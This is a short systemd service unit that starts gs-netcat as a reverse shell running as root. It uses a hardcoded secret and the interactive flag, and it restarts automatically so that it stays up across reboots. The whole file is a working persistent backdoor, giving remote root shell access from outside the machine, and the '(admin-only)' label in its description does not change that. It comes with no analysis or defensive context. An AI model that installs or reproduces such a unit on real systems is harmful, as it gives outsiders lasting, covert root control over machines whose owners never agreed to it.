# /etc/systemd/system/gs-netcat-rev.service
[Unit]
Description=Reverse shell gs-netcat (admin-only)
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/usr/local/bin/gs-netcat -s "3YCMpn2GnQPe7DztqBuA5w" -i
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
